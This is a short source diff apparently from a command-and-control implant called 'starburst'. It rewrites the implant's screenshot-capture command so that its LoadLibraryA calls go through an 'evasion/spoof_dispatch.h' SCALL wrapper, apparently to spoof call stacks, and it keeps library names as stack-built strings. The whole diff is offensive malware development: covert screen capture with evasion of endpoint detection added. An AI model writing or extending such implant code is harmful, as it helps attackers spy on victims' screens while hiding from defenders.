@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_SCREENSHOT
 
@@ -69,11 +70,11 @@ auto declfn starburst::cmd_screenshot(
     STK_OLE32(_n_ole32);
     STK_COMBASE(_n_combase);
 
-    auto h_user32  = inst.kernel32.LoadLibraryA( _n_user32 );
-    auto h_gdi32   = inst.kernel32.LoadLibraryA( _n_gdi32 );
-    auto h_gdiplus = inst.kernel32.LoadLibraryA( _n_gdiplus );
-    auto h_ole32   = inst.kernel32.LoadLibraryA( _n_ole32 );
-    auto h_combase = inst.kernel32.LoadLibraryA( _n_combase );
+    auto h_user32  = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_user32 );
+    auto h_gdi32   = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_gdi32 );
+    auto h_gdiplus = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_gdiplus );
+    auto h_ole32   = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_ole32 );
+    auto h_combase = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_combase );
 
     if ( !h_user32 || !h_gdi32 || !h_gdiplus || !h_ole32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
